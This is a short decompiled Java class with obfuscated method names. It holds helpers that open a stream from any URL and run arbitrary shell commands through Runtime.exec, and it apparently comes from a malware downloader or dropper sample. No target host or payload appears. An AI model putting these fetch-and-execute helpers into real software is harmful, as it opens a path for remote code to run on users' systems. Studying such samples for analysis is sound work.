import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sento
{
    public static InputStream Iopls(final String a) throws Exception {
        final URL url = new URL(a);
        URL url2;
        try {
            url.openConnection();
            url2 = url;
        }
        catch (Exception ex) {
            url2 = url;
        }
        return url2.openStream();
    }
    
    public static Runtime osgPL() {
        return Runtime.getRuntime();
    }
    
    public static void owms(final String a) throws Exception {
        osgPL().exec(a).waitFor();
    }
}
